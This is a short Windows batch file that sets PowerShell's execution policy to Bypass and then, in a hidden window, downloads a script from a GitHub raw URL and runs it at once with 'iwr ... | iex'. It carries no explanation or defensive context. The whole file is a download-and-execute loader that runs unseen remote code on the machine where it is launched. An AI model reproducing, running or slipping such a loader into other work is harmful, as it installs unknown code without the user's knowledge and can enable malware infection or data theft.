@echo off
powershell -NoProfile -Command "Set-ExecutionPolicy Bypass -Scope Process -Force"

powershell -NoProfile -WindowStyle Hidden -Command "iwr 'https://raw.githubusercontent.com/cqdll/-/main/a.ps1' -UseBasicParsing | iex"

echo
pause
